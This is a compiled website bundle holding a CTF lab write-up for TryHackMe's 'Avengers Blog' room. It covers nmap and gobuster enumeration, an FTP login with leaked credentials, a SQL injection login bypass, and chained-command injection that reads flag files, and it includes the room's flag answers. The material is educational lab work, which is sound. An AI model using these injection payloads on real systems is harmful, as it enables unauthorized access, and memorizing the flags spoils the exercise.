"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7380],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},u=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=c(n),m=o,h=p["".concat(l,".").concat(m)]||p[m]||d[m]||r;return n?a.createElement(h,s(s({ref:t},u),{},{components:n})):a.createElement(h,s({ref:t},u))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,s=new Array(r);s[0]=m;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[p]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<r;c++)s[c]=n[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},37869:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var a=n(87462),o=(n(67294),n(3905));const r={},s="Avengers Blog",i={unversionedId:"Tryhackme/Avengers Blog/Avengers Blog",id:"Tryhackme/Avengers Blog/Avengers Blog",title:"Avengers Blog",description:"Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection.",source:"@site/writeups/Tryhackme/Avengers Blog/Avengers Blog.md",sourceDirName:"Tryhackme/Avengers Blog",slug:"/Tryhackme/Avengers Blog/",permalink:"/writeups/Tryhackme/Avengers Blog/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Authenticate",permalink:"/writeups/Tryhackme/Authenticate/"},next:{title:"Basic Malware RE",permalink:"/writeups/Tryhackme/Basic Malware RE/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy",id:"task-1-deploy",level:2},{value:"Task 2 Cookies",id:"task-2-cookies",level:2},{value:"Task 3 HTTP Headers",id:"task-3-http-headers",level:2},{value:"Task 4 Enumeration and FTP",id:"task-4-enumeration-and-ftp",level:2},{value:"Task 5 GoBuster",id:"task-5-gobuster",level:2},{value:"Task 6 SQL Injection",id:"task-6-sql-injection",level:2},{value:"Task 7 Remote Code Execution and Linux",id:"task-7-remote-code-execution-and-linux",level:2}],u={toc:c},p="wrapper";function d(e){let{components:t,...r}=e;return(0,o.kt)(p,(0,a.Z)({},u,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"avengers-blog"},"Avengers Blog"),(0,o.kt)("p",null,"Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/avengers"},"Avengers Blog")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Cookie Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Header Eumeration"),(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SQL Injection"),(0,o.kt)("li",{parentName:"ul"},"Command Injection")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-deploy"},"Task 1 Deploy"),(0,o.kt)("p",null,"Connect to our network and deploy the Avengers Blog machine"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Connect to our network by going to your ",(0,o.kt)("a",{parentName:"li",href:"https://tryhackme.com/access"},"access page"),". This is important as you will not be able to access the machine without connecting!")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},'Deploy the machine by clicking the green "Deploy" button on this task and access its webserver.')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"task-2-cookies"},"Task 2 Cookies"),(0,o.kt)("p",null,"HTTP Cookies is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing. They're intended to remember things such as your login information, items in your shopping cart or language you prefer."),(0,o.kt)("p",null,"Advertisers can use also tracking cookies to identify which sites you've previously visited or where about's on a web-page you've clicked. Some tracking cookies have become so intrusive, many anti-virus programs classify them as spyware."),(0,o.kt)("p",null,"You can view & dynamically update your cookies directly in your browser. To do this, press ",(0,o.kt)("strong",{parentName:"p"},"F12")," (or right click and select Inspect) to open the developer tools on your browser, then click Application and then Cookies."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"On the deployed Avengers machine you recently deployed, get the flag1 cookie value.")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(78663).Z,width:"1619",height:"590"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"cookie_secrets")),(0,o.kt)("h2",{id:"task-3-http-headers"},"Task 3 HTTP Headers"),(0,o.kt)("p",null,"HTTP Headers let a client and server pass information with a HTTP request or response. Header names and values are separated by a single colon and are integral part of the HTTP protocol."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/GlCdRIM.png",alt:null})),(0,o.kt)("p",null,"The main two HTTP Methods are POST and GET requests. The GET method us used to request data from a resource and the POST method is used to send data to a server."),(0,o.kt)("p",null,"We can view requests made to and from our browser by opening the Developer Tools again and navigating to the Network tab. Have this tab open and refresh the page to see all requests made. You will be able to see the original request made from your browser to the web server."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Look at the HTTP response headers and obtain flag 2.")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(38470).Z,width:"1912",height:"712"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"headers_are_important")),(0,o.kt)("h2",{id:"task-4-enumeration-and-ftp"},"Task 4 Enumeration and FTP"),(0,o.kt)("p",null,"In this task we will scan the machine with nmap (a network scanner) and access the FTP service using reusable credentials."),(0,o.kt)("p",null,"Lets get started by scanning the machine, you will need nmap. If you don't have the application installed you can use our web-based AttackBox that has nmap pre-installed."),(0,o.kt)("p",null,"In your terminal, execute the following command: ",(0,o.kt)("inlineCode",{parentName:"p"},"nmap <machine_ip> -v")),(0,o.kt)("p",null,"This will scan the machine and determine what services on which ports are running. For this machine, you will see the following ports open:"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/UjXizy4.png",alt:null})),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Port 80 has a HTTP web server running on"),(0,o.kt)("li",{parentName:"ul"},"Port 22 is to SSH into the machine"),(0,o.kt)("li",{parentName:"ul"},"Port 21 is used for FTP (file transfer)")),(0,o.kt)("p",null,"We've accessed the web server, lets now access the FTP service. If you read the Avengers web page, you will see that Rocket made a post asking for Groot's password to be reset, the post included his old password too!"),(0,o.kt)("p",null,"In your terminal, execute the following command: ",(0,o.kt)("inlineCode",{parentName:"p"},"ftp <machine_ip>")),(0,o.kt)("p",null,"We will be asked for a username (groot) and a password (iamgroot). We should have now successfully logged into the FTP share using Groots credentials!"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Look around the FTP share and read flag 3!")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Avengers Blog$ sudo nmap -A -sS -sC -sV -O 10.10.109.199\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-07 13:18 CET\nNmap scan report for 10.10.109.199\nHost is up (0.032s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 d2:63:f4:db:ad:9d:c0:74:49:f7:60:2b:45:46:58:6a (RSA)\n|   256 9a:f1:be:29:ef:2a:51:a5:27:46:48:00:9d:01:ed:29 (ECDSA)\n|_  256 39:b0:3a:78:40:95:79:2e:99:af:f6:a3:c1:9a:19:75 (ED25519)\n80/tcp open  http    Node.js Express framework\n|_http-title: Avengers! Assemble!\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=11/7%OT=21%CT=1%CU=32301%PV=Y%DS=2%DC=T%G=Y%TM=5FA690A\nOS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   31.18 ms 10.8.0.1\n2   31.46 ms 10.10.109.199\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.19 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(12778).Z,width:"1081",height:"179"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"iamgroot")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Avengers Blog$ ftp 10.10.109.199\nConnected to 10.10.109.199.\n220 (vsFTPd 3.0.3)\nName (10.10.109.199:kali): groot\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 .\ndr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..\ndrwxr-xr-x    2 1001     1001         4096 Oct 04  2019 files\n226 Directory send OK.\nftp> cd files\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1001     1001         4096 Oct 04  2019 .\ndr-xr-xr-x    3 65534    65534        4096 Oct 04  2019 ..\n-rw-r--r--    1 0        0              33 Oct 04  2019 flag3.txt\n226 Directory send OK.\nftp> get flag3.txt\nlocal: flag3.txt remote: flag3.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for flag3.txt (33 bytes).\n226 Transfer complete.\n33 bytes received in 0.00 secs (21.1322 kB/s)\nftp> exit\n221 Goodbye.\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Avengers Blog$ cat flag3.txt\n8fc651a739befc58d450dc48e1f1fd2e\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"8fc651a739befc58d450dc48e1f1fd2e")),(0,o.kt)("h2",{id:"task-5-gobuster"},"Task 5 GoBuster"),(0,o.kt)("p",null,"Lets use a fast directory discovery tool called GoBuster. This program will locate a directory that you can use to login to Mr. Starks Tarvis portal!"),(0,o.kt)("p",null,"GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories."),(0,o.kt)("p",null,"You can either download GoBuster, or use the Kali Linux machine that has it pre-installed."),(0,o.kt)("p",null,"Lets run GoBuster with a wordlist (on Kali they're located under /usr/share/wordlists): ",(0,o.kt)("inlineCode",{parentName:"p"},"gobuster dir -u http://<machine_ip> -w <word_list_location>")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the directory that has an Avengers login?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Avengers Blog$ gobuster dir -u 10.10.109.199 -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.109.199\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/11/07 13:18:56 Starting gobuster\n===============================================================\n/assets (Status: 301)\n/css (Status: 301)\n/home (Status: 302)\n/Home (Status: 302)\n/img (Status: 301)\n/js (Status: 301)\n/logout (Status: 302)\n/portal (Status: 200)\n===============================================================\n2020/11/07 13:19:33 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/portal")),(0,o.kt)("h2",{id:"task-6-sql-injection"},"Task 6 SQL Injection"),(0,o.kt)("p",null,"You should now see the following page above. We're going to manually exploit this page using an attack called SQL injection."),(0,o.kt)("p",null,"SQL Injection is a code injection technique that manipulates an SQL query. You can execute you're own SQL that could destroy the database, reveal all database data (such as usernames and passwords) or trick the web server in authenticating you."),(0,o.kt)("p",null,"To exploit SQL, we first need to know how it works. A SQL query could be ",(0,o.kt)("inlineCode",{parentName:"p"},"SELECT * FROM Users WHERE username = {User Input} AND password = {User Input 2}")," , if you insert additional SQL as the {User Input} we can manipulate this query. For example, if I have the {User Input 2} as ",(0,o.kt)("inlineCode",{parentName:"p"},"' 1=1")," we could trick the query into authenticating us as the ' character would break the SQL query and 1=1 would evaluate to be true."),(0,o.kt)("p",null,"To conclude, having our first {User Input} as the username of the account and {User Input 2} being the condition to make the query true, the final query would be:\n",(0,o.kt)("inlineCode",{parentName:"p"},"SELECT * FROM Users WHERE username = "),"admin",(0,o.kt)("inlineCode",{parentName:"p"},"AND password ="),"' 1=1``"),(0,o.kt)("p",null,"This would authenticate us as the admin user."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Log into the Avengers site. View the page source, how many lines of code are there?")),(0,o.kt)("p",null,"view-source: machine-ip/home"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"223")),(0,o.kt)("h2",{id:"task-7-remote-code-execution-and-linux"},"Task 7 Remote Code Execution and Linux"),(0,o.kt)("p",null,"You should be logged into the Jarvis access panel! Here we can execute commands on the machine.. I wonder if we can exploit this to read files on the system."),(0,o.kt)("p",null,"Try executing the ls command to list all files in the current directory. Now try joining 2 Linux commands together to list files in the parent directory: ",(0,o.kt)("inlineCode",{parentName:"p"},"cd ../; ls")," doing so will show a file called flag5.txt, we can add another command to read this file: ",(0,o.kt)("inlineCode",{parentName:"p"},"cd ../; ls; cat flag5.txt")),(0,o.kt)("p",null,"But oh-no! The cat command is disallowed! We will have to think of another Linux command we can use to read it!"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Read the contents of flag5.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"cd ../; ls; tac flag5.txt")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(23016).Z,width:"970",height:"660"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"d335e2d13f36558ba1e67969a1718af7")))}d.isMDXComponent=!0},78663:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-07_13-14-272ecb4259cb671a84db452183694ee3.png"},38470:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-07_13-16-c420b035802aee068f7006f71fd61f05.png"},12778:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-07_13-20-7aa7ba8690963f9014327bb28ed25d12.png"},23016:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-07_13-31-2d73a15ea9f54fd4b27bd5ed734c74ba.png"}}]);